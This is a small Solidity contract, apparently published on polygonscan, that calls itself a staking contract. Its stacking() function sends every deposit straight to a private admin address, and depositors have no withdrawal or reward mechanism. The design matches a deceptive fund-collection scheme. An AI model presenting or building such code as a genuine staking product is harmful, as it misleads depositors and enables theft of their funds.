/**
 *Submitted for verification at polygonscan.com on 2022-08-25
*/

pragma solidity ^0.5.4;
        
    contract KAIZEN_STACK {
        uint256 public latestReferrerCode;
        
        address payable private adminAccount_;   
        event Stake(address investor,uint256 amount);
             
        constructor(address payable _admin) public {
           
            adminAccount_=_admin;
        }
        
        function setAdminAccount(address payable _newAccount) public  {
            require(_newAccount != address(0) && msg.sender==adminAccount_);
            adminAccount_ = _newAccount;
        }
            
        function stacking() public payable
        {
            require(msg.value>0);
            adminAccount_.transfer(address(this).balance);
            emit Stake(msg.sender,msg.value);
        }   
    }